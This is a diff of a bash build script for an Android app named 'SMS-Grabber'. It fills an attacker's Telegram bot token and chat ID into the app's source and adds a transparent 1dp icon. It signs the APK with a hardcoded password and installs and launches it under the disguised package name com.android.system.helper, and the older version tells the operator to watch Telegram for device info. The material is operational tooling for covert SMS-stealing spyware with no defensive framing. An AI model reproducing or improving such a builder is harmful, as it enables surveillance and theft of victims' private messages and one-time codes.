@@ -1,21 +1,26 @@
 #!/bin/bash
-
 # ============================================================
-# SMS-Grabber Build Script
-# Builds, obfuscates, and signs the APK
+# SMS-Grabber Build Script v1.1
+# Fixed for Termux / local builds
 # ============================================================
 
 set -e
 
-# ========== Configuration ==========
-PROJECT_DIR="."
-APK_OUTPUT="app/build/outputs/apk/release"
-KEYSTORE="smsgrabber.keystore"
+# ========== Paths ==========
+PROJECT_DIR="$(cd "$(dirname "$0")" && pwd)"
+cd "$PROJECT_DIR"
+
+APK_DEBUG="app/build/outputs/apk/debug/app-debug.apk"
+APK_RELEASE="app/build/outputs/apk/release/app-release.apk"
+APK_RELEASE_UNSIGNED="app/build/outputs/apk/release/app-release-unsigned.apk"
+
+KEYSTORE="$PROJECT_DIR/smsgrabber.keystore"
 KEY_ALIAS="smsgrabber"
 KEY_PASS="android123"
-VALIDITY_DAYS="10000"
+TELEGRAM_FILE="$PROJECT_DIR/app/src/main/java/com/smsgrabber/TelegramApi.kt"
+LOCAL_PROPS="$PROJECT_DIR/local.properties"
 
-# Colors
+# ========== Colors ==========
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -23,277 +28,324 @@ CYAN='\033[0;36m'
 BLUE='\033[0;34m'
 NC='\033[0m'
 
-# ========== Functions ==========
-
 banner() {
     clear
     echo -e "${RED}"
     echo "  ╔══════════════════════════════════════════╗"
-    echo "  ║          SMS-Grabber Builder             ║"
-    echo "  ║       Android APK Generator v1.0         ║"
+    echo "  ║       SMS-Grabber Builder v1.1           ║"
+    echo "  ║       Android APK Generator              ║"
     echo "  ╚══════════════════════════════════════════╝"
     echo -e "${NC}"
     echo ""
 }
 
-check_dependencies() {
-    echo -e "${CYAN}[*] Checking dependencies...${NC}"
+log_ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
+log_info() { echo -e "${CYAN}[*]${NC} $1"; }
+log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
+log_err()  { echo -e "${RED}[✗]${NC} $1"; }
 
-    # Check Java
-    if ! command -v java &>/dev/null; then
-        echo -e "${RED}[!] Java JDK 17+ is required. Please install it first.${NC}"
+# ========== 1. Check Java ==========
+check_java() {
+    log_info "Checking Java..."
+    if ! command -v java >/dev/null 2>&1; then
+        log_err "Java not found. Install: pkg install openjdk-21"
         exit 1
     fi
-
-    JAVA_VER=$(java -version 2>&1 | awk -F '"' '/version/ {print $2}' | cut -d'.' -f1)
-    echo -e "    ${GREEN}✔${NC} Java version: ${JAVA_VER}"
-
-    # Check Android SDK
-    if [ -z "$ANDROID_HOME" ] && [ -z "$ANDROID_SDK_ROOT" ]; then
-        echo -e "${YELLOW}[!] ANDROID_HOME not set. Trying common paths...${NC}"
-        if [ -d "$HOME/Android/Sdk" ]; then
-            export ANDROID_HOME="$HOME/Android/Sdk"
-        elif [ -d "/usr/local/lib/android/sdk" ]; then
-            export ANDROID_HOME="/usr/local/lib/android/sdk"
-        fi
-    fi
-    echo -e "    ${GREEN}✔${NC} ANDROID_HOME: ${ANDROID_HOME:-not set}"
-
-    echo -e "${GREEN}[✓] All dependencies OK${NC}"
-    echo ""
+    JAVA_VER=$(java -version 2>&1 | head -n1)
+    log_ok "Java found: $JAVA_VER"
 }
 
-configure_telegram() {
-    echo -e "${CYAN}[*] Configure Telegram Bot...${NC}"
+# ========== 2. Setup ANDROID_HOME ==========
+setup_android_home() {
+    log_info "Checking ANDROID_HOME..."
 
-    TELEGRAM_FILE="$PROJECT_DIR/app/src/main/java/com/smsgrabber/TelegramApi.kt"
+    if [ -z "$ANDROID_HOME" ]; then
+        if [ -n "$ANDROID_SDK_ROOT" ]; then
+            export ANDROID_HOME="$ANDROID_SDK_ROOT"
+        elif [ -d "$HOME/android-sdk" ]; then
+            export ANDROID_HOME="$HOME/android-sdk"
+        elif [ -d "$HOME/Android/Sdk" ]; then
+            export ANDROID_HOME="$HOME/Android/Sdk"
+        elif [ -d "/usr/lib/android-sdk" ]; then
+            export ANDROID_HOME="/usr/lib/android-sdk"
+        fi
+    fi
+
+    if [ -z "$ANDROID_HOME" ] || [ ! -d "$ANDROID_HOME" ]; then
+        log_warn "ANDROID_HOME not set / SDK not found"
+        log_warn "Build may fail without Android SDK"
+    else
+        export ANDROID_SDK_ROOT="$ANDROID_HOME"
+        export PATH="$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/34.0.0"
+        log_ok "ANDROID_HOME=$ANDROID_HOME"
+    fi
+
+    # Create local.properties if missing
+    if [ ! -f "$LOCAL_PROPS" ]; then
+        if [ -n "$ANDROID_HOME" ]; then
+            echo "sdk.dir=$ANDROID_HOME" > "$LOCAL_PROPS"
+            log_ok "Created local.properties"
+        else
+            log_warn "Skipped local.properties (no ANDROID_HOME)"
+        fi
+    else
+        log_ok "local.properties exists"
+    fi
+}
+
+# ========== 3. Fix project structure ==========
+fix_project() {
+    log_info "Fixing project structure..."
+
+    # Drawable
+    mkdir -p app/src/main/res/drawable
+    if [ ! -f "app/src/main/res/drawable/ic_transparent.xml" ]; then
+        cat > app/src/main/res/drawable/ic_transparent.xml << 'EOF'
+<?xml version="1.0" encoding="utf-8"?>
+<vector xmlns:android="http://schemas.android.com/apk/res/android"
+    android:width="1dp"
+    android:height="1dp"
+    android:viewportWidth="1"
+    android:viewportHeight="1">
+    <path android:fillColor="#00000000" android:pathData="M0,0h1v1h-1z"/>
+</vector>
+EOF
+        log_ok "Created ic_transparent.xml"
+    else
+        log_ok "ic_transparent.xml OK"
+    fi
+
+    # Remove wrong drawable path if empty leftover
+    if [ -d "app/src/drawable" ] && [ -z "$(ls -A app/src/drawable 2>/dev/null)" ]; then
+        rmdir app/src/drawable 2>/dev/null || true
+    fi
+
+    # Move drawable if still in wrong place
+    if [ -f "app/src/drawable/ic_transparent.xml" ]; then
+        mv -f app/src/drawable/ic_transparent.xml app/src/main/res/drawable/
+        rmdir app/src/drawable 2>/dev/null || true
+        log_ok "Moved drawable to correct path"
+    fi
+}
+
+# ========== 4. Telegram config ==========
+config_telegram() {
+    log_info "Configure Telegram Bot..."
 
     if [ ! -f "$TELEGRAM_FILE" ]; then
-        echo -e "${RED}[!] TelegramApi.kt not found at: $TELEGRAM_FILE${NC}"
+        log_err "TelegramApi.kt not found: $TELEGRAM_FILE"
         exit 1
     fi
 
-    if grep -q "YOUR_BOT_TOKEN_HERE" "$TELEGRAM_FILE"; then
-        echo -ne "${YELLOW}[?] Enter your Telegram Bot Token: ${NC}"
+    if grep -q "YOUR_BOT_TOKEN_HERE" "$TELEGRAM_FILE" 2>/dev/null; then
+        echo -ne "${YELLOW}[?] Enter Bot Token: ${NC}"
         read -r BOT_TOKEN
-
-        if [ -z "$BOT_TOKEN" ]; then
-            echo -e "${RED}[!] Bot Token cannot be empty!${NC}"
-            exit 1
-        fi
-
-        echo -ne "${YELLOW}[?] Enter your Telegram Chat ID: ${NC}"
+        echo -ne "${YELLOW}[?] Enter Chat ID: ${NC}"
         read -r CHAT_ID
 
-        if [ -z "$CHAT_ID" ]; then
-            echo -e "${RED}[!] Chat ID cannot be empty!${NC}"
+        if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
+            log_err "Token and Chat ID required"
             exit 1
         fi
 
-        # Replace placeholders
-        if [[ "$OSTYPE" == "darwin"* ]]; then
-            sed -i '' "s/YOUR_BOT_TOKEN_HERE/$BOT_TOKEN/" "$TELEGRAM_FILE"
-            sed -i '' "s/YOUR_CHAT_ID_HERE/$CHAT_ID/" "$TELEGRAM_FILE"
+        # Portable sed (Linux + Termux + macOS)
+        if sed --version >/dev/null 2>&1; then
+            sed -i "s|YOUR_BOT_TOKEN_HERE|$BOT_TOKEN|g" "$TELEGRAM_FILE"
+            sed -i "s|YOUR_CHAT_ID_HERE|$CHAT_ID|g" "$TELEGRAM_FILE"
         else
-            sed -i "s/YOUR_BOT_TOKEN_HERE/$BOT_TOKEN/" "$TELEGRAM_FILE"
-            sed -i "s/YOUR_CHAT_ID_HERE/$CHAT_ID/" "$TELEGRAM_FILE"
+            sed -i '' "s|YOUR_BOT_TOKEN_HERE|$BOT_TOKEN|g" "$TELEGRAM_FILE"
+            sed -i '' "s|YOUR_CHAT_ID_HERE|$CHAT_ID|g" "$TELEGRAM_FILE"
         fi
-
-        echo -e "${GREEN}[✓] Telegram configured successfully${NC}"
+        log_ok "Telegram configured"
     else
-        echo -e "${GREEN}[✓] Telegram already configured${NC}"
+        log_ok "Telegram already configured"
     fi
-    echo ""
 }
 
+# ========== 5. Keystore ==========
 generate_keystore() {
-    if [ ! -f "$KEYSTORE" ]; then
-        echo -e "${CYAN}[*] Generating signing keystore...${NC}"
-        keytool -genkey -v \
-            -keystore "$KEYSTORE" \
-            -alias "$KEY_ALIAS" \
-            -keyalg RSA \
-            -keysize 2048 \
-            -validity "$VALIDITY_DAYS" \
-            -storepass "$KEY_PASS" \
-            -keypass "$KEY_PASS" \
-            -dname "CN=SMS-Grabber, OU=Security, O=SMS-Grabber, L=Unknown, S=Unknown, C=US" \
-            2>/dev/null
-        echo -e "${GREEN}[✓] Keystore created: $KEYSTORE${NC}"
-    else
-        echo -e "${GREEN}[✓] Keystore already exists: $KEYSTORE${NC}"
+    if [ -f "$KEYSTORE" ]; then
+        log_ok "Keystore exists: $KEYSTORE"
+        return
     fi
-    echo ""
+
+    log_info "Generating keystore..."
+    keytool -genkey -v \
+        -keystore "$KEYSTORE" \
+        -alias "$KEY_ALIAS" \
+        -keyalg RSA \
+        -keysize 2048 \
+        -validity 10000 \
+        -storepass "$KEY_PASS" \
+        -keypass "$KEY_PASS" \
+        -dname "CN=SMS-Grabber, OU=Security, O=SMS-Grabber, L=Unknown, S=Unknown, C=US" \
+        >/dev/null 2>&1
+    log_ok "Keystore created"
 }
 
-clean_build() {
-    echo -e "${CYAN}[*] Cleaning previous builds...${NC}"
-    rm -rf app/build/
-    rm -f smsgrabber-signed.apk smsgrabber-unsigned.apk
-    echo -e "${GREEN}[✓] Cleaned${NC}"
-    echo ""
-}
+# ========== 6. Ensure Gradle / gradlew ==========
+setup_gradle() {
+    log_info "Checking Gradle..."
 
-build_apk() {
-    echo -e "${CYAN}[*] Building APK (Release + ProGuard)...${NC}"
-    echo ""
-
-    # Make gradlew executable
     if [ -f "./gradlew" ]; then
         chmod +x ./gradlew
-        ./gradlew clean assembleRelease --no-daemon 2>&1 | while IFS= read -r line; do
-            echo -e "    ${BLUE}│${NC} $line"
-        done
-    else
-        echo -e "${YELLOW}[!] gradlew not found. Checking for system Gradle...${NC}"
-        if command -v gradle &>/dev/null; then
-            gradle clean assembleRelease --no-daemon
-        else
-            echo -e "${RED}[!] No Gradle found. Please install Gradle or generate gradlew.${NC}"
-            exit 1
-        fi
+        GRADLE_CMD="./gradlew"
+        log_ok "Using ./gradlew"
+        return
     fi
 
-    echo ""
-
-    UNSIGNED_APK="$PROJECT_DIR/$APK_OUTPUT/app-release-unsigned.apk"
-
-    if [ -f "$UNSIGNED_APK" ]; then
-        echo -e "${GREEN}[✓] APK built successfully${NC}"
-        cp "$UNSIGNED_APK" ./smsgrabber-unsigned.apk
-    else
-        echo -e "${YELLOW}[!] Release APK not found. Checking debug...${NC}"
-        DEBUG_APK="app/build/outputs/apk/debug/app-debug.apk"
-        if [ -f "$DEBUG_APK" ]; then
-            echo -e "${GREEN}[✓] Debug APK found${NC}"
-            cp "$DEBUG_APK" ./smsgrabber-unsigned.apk
-        else
-            echo -e "${RED}[!] Build failed - no APK found${NC}"
-            exit 1
+    if command -v gradle >/dev/null 2>&1; then
+        log_info "gradlew missing — generating wrapper..."
+        gradle wrapper --gradle-version 8.5
+        if [ -f "./gradlew" ]; then
+            chmod +x ./gradlew
+            GRADLE_CMD="./gradlew"
+            log_ok "Wrapper created"
+            return
         fi
+        GRADLE_CMD="gradle"
+        log_warn "Using system gradle"
+        return
     fi
+
+    log_err "Neither gradlew nor gradle found!"
     echo ""
+    echo -e "${YELLOW}Install Gradle first:${NC}"
+    echo "  pkg install openjdk-21 wget unzip"
+    echo "  cd ~ && wget https://services.gradle.org/distributions/gradle-8.5-bin.zip"
+    echo "  unzip gradle-8.5-bin.zip"
+    echo "  export PATH=\"\$HOME/gradle-8.5/bin:\$PATH\""
+    echo "  cd ~/camorro && gradle wrapper --gradle-version 8.5"
+    echo "  ./build.sh"
+    exit 1
 }
 
-sign_apk() {
-    echo -e "${CYAN}[*] Signing APK...${NC}"
+# ========== 7. Build ==========
+build_apk() {
+    log_info "Building APK (debug first — more reliable)..."
+    echo ""
 
-    INPUT_APK="smsgrabber-unsigned.apk"
-    OUTPUT_APK="smsgrabber-signed.apk"
+    # Debug first (no signing/proguard issues)
+    $GRADLE_CMD clean assembleDebug --stacktrace --no-daemon || {
+        log_err "Debug build failed"
+        exit 1
+    }
 
-    if command -v apksigner &>/dev/null; then
-        echo -e "    Using: apksigner"
+    if [ -f "$APK_DEBUG" ]; then
+        cp -f "$APK_DEBUG" "$PROJECT_DIR/smsgrabber-debug.apk"
+        log_ok "Debug APK: smsgrabber-debug.apk"
+    else
+        log_err "Debug APK not found after build"
+        exit 1
+    fi
+
+    # Optional release
+    log_info "Trying release build..."
+    if $GRADLE_CMD assembleRelease --stacktrace --no-daemon; then
+        if [ -f "$APK_RELEASE" ]; then
+            cp -f "$APK_RELEASE" "$PROJECT_DIR/smsgrabber-signed.apk"
+            log_ok "Release APK: smsgrabber-signed.apk"
+        elif [ -f "$APK_RELEASE_UNSIGNED" ]; then
+            cp -f "$APK_RELEASE_UNSIGNED" "$PROJECT_DIR/smsgrabber-unsigned.apk"
+            log_ok "Unsigned release APK: smsgrabber-unsigned.apk"
+            sign_apk_if_possible
+        fi
+    else
+        log_warn "Release failed — use debug APK"
+    fi
+}
+
+sign_apk_if_possible() {
+    if [ ! -f "$PROJECT_DIR/smsgrabber-unsigned.apk" ]; then
+        return
+    fi
+
+    log_info "Signing APK..."
+    if command -v apksigner >/dev/null 2>&1; then
         apksigner sign \
             --ks "$KEYSTORE" \
             --ks-key-alias "$KEY_ALIAS" \
             --ks-pass "pass:$KEY_PASS" \
             --key-pass "pass:$KEY_PASS" \
-            --out "$OUTPUT_APK" \
-            "$INPUT_APK" 2>/dev/null
+            --out "$PROJECT_DIR/smsgrabber-signed.apk" \
+            "$PROJECT_DIR/smsgrabber-unsigned.apk" && \
+        log_ok "Signed with apksigner" && return
+    fi
 
-        if apksigner verify "$OUTPUT_APK" &>/dev/null; then
-            echo -e "${GREEN}[✓] APK signed & verified: $OUTPUT_APK${NC}"
-        else
-            echo -e "${RED}[!] Signature verification failed${NC}"
-        fi
-
-    elif command -v jarsigner &>/dev/null; then
-        echo -e "    Using: jarsigner"
-        jarsigner -verbose \
-            -sigalg SHA256withRSA \
-            -digestalg SHA-256 \
+    if command -v jarsigner >/dev/null 2>&1; then
+        jarsigner -sigalg SHA256withRSA -digestalg SHA-256 \
             -keystore "$KEYSTORE" \
-            -storepass "$KEY_PASS" \
-            -keypass "$KEY_PASS" \
-            "$INPUT_APK" \
-            "$KEY_ALIAS" 2>/dev/null
-
-        # Zip align
-        if command -v zipalign &>/dev/null; then
-            zipalign -v 4 "$INPUT_APK" "$OUTPUT_APK" 2>/dev/null
-        else
-            cp "$INPUT_APK" "$OUTPUT_APK"
-        fi
-        echo -e "${GREEN}[✓] APK signed: $OUTPUT_APK${NC}"
-
-    else
-        echo -e "${RED}[!] No signing tool found (apksigner or jarsigner)${NC}"
-        cp "$INPUT_APK" "$OUTPUT_APK"
-        echo -e "${YELLOW}[!] Copied unsigned APK as: $OUTPUT_APK${NC}"
+            -storepass "$KEY_PASS" -keypass "$KEY_PASS" \
+            "$PROJECT_DIR/smsgrabber-unsigned.apk" "$KEY_ALIAS"
+        cp -f "$PROJECT_DIR/smsgrabber-unsigned.apk" "$PROJECT_DIR/smsgrabber-signed.apk"
+        log_ok "Signed with jarsigner"
+        return
     fi
-    echo ""
+
+    log_warn "No signer found — use debug APK"
 }
 
+# ========== 8. Install (optional) ==========
 install_apk() {
-    if command -v adb &>/dev/null; then
-        DEVICES=$(adb devices 2>/dev/null | grep -v "List" | grep "device$" | wc -l)
-        if [ "$DEVICES" -gt 0 ]; then
-            echo ""
-            echo -e "${YELLOW}╔══════════════════════════════════════════╗${NC}"
-            echo -e "${YELLOW}║  Device detected!                       ║${NC}"
-            echo -e "${YELLOW}╚══════════════════════════════════════════╝${NC}"
-            adb devices | grep "device$"
-            echo ""
-            echo -ne "${YELLOW}[?] Install on connected device? [y/N]: ${NC}"
-            read -r INSTALL
+    if ! command -v adb >/dev/null 2>&1; then
+        return
+    fi
+    if ! adb devices 2>/dev/null | grep -q "device$"; then
+        return
+    fi
 
-            if [ "$INSTALL" = "y" ] || [ "$INSTALL" = "Y" ]; then
-                echo -e "${CYAN}[*] Installing APK...${NC}"
-                adb install -r smsgrabber-signed.apk
-                echo -e "${GREEN}[✓] Installed successfully${NC}"
+    APK_TO_INSTALL=""
+    if [ -f "$PROJECT_DIR/smsgrabber-signed.apk" ]; then
+        APK_TO_INSTALL="$PROJECT_DIR/smsgrabber-signed.apk"
+    elif [ -f "$PROJECT_DIR/smsgrabber-debug.apk" ]; then
+        APK_TO_INSTALL="$PROJECT_DIR/smsgrabber-debug.apk"
+    else
+        return
+    fi
 
-                echo -e "${CYAN}[*] Launching app...${NC}"
-                adb shell am start -n com.android.system.helper/com.smsgrabber.MainActivity 2>/dev/null || true
-                echo -e "${GREEN}[✓] App launched (check Telegram for device info)${NC}"
-            fi
-        fi
+    echo ""
+    echo -ne "${YELLOW}[?] Install on connected device? [y/N]: ${NC}"
+    read -r ANS
+    if [ "$ANS" = "y" ] || [ "$ANS" = "Y" ]; then
+        adb install -r "$APK_TO_INSTALL"
+        log_ok "Installed: $APK_TO_INSTALL"
+        adb shell am start -n com.android.system.helper/com.smsgrabber.MainActivity 2>/dev/null || true
     fi
 }
 
+# ========== 9. Summary ==========
 summary() {
-    APK_SIZE="N/A"
-    APK_MD5="N/A"
-
-    if [ -f "smsgrabber-signed.apk" ]; then
-        APK_SIZE=$(du -h smsgrabber-signed.apk | cut -f1)
-        if command -v md5sum &>/dev/null; then
-            APK_MD5=$(md5sum smsgrabber-signed.apk | cut -c1-32)
-        elif command -v md5 &>/dev/null; then
-            APK_MD5=$(md5 -q smsgrabber-signed.apk)
-        fi
-    fi
-
     echo ""
     echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
-    echo -e "${GREEN}║          BUILD COMPLETE!                 ║${NC}"
+    echo -e "${GREEN}║            BUILD COMPLETE                ║${NC}"
     echo -e "${GREEN}╠══════════════════════════════════════════╣${NC}"
-    echo -e "${GREEN}║                                          ║${NC}"
-    echo -e "${GREEN}║  📦 APK: smsgrabber-signed.apk           ║${NC}"
-    echo -e "${GREEN}║  📏 Size: $APK_SIZE                          ║${NC}"
-    echo -e "${GREEN}║  🔑 MD5:  $APK_MD5  ║${NC}"
-    echo -e "${GREEN}║                                          ║${NC}"
-    echo -e "${GREEN}╠══════════════════════════════════════════╣${NC}"
-    echo -e "${GREEN}║  📲 Transfer:                            ║${NC}"
-    echo -e "${GREEN}║     adb install smsgrabber-signed.apk    ║${NC}"
-    echo -e "${GREEN}║     scp smsgrabber-signed.apk user@host: ║${NC}"
+
+    for f in smsgrabber-debug.apk smsgrabber-signed.apk smsgrabber-unsigned.apk; do
+        if [ -f "$PROJECT_DIR/$f" ]; then
+            SIZE=$(du -h "$PROJECT_DIR/$f" | cut -f1)
+            echo -e "${GREEN}║  📦 $f ($SIZE)${NC}"
+        fi
+    done
+
     echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
+    echo ""
+    echo -e "Install: ${CYAN}adb install -r smsgrabber-debug.apk${NC}"
+    echo -e "Or copy APK to phone and install manually."
     echo ""
 }
 
 # ========== Main ==========
-
 main() {
     banner
-    check_dependencies
-    configure_telegram
+    check_java
+    setup_android_home
+    fix_project
+    config_telegram
     generate_keystore
-    clean_build
+    setup_gradle
     build_apk
-    sign_apk
     install_apk
     summary
-
-    echo -e "${GREEN}[✓] Done! Check your Telegram for device info when app launches.${NC}"
 }
 
 main "$@"
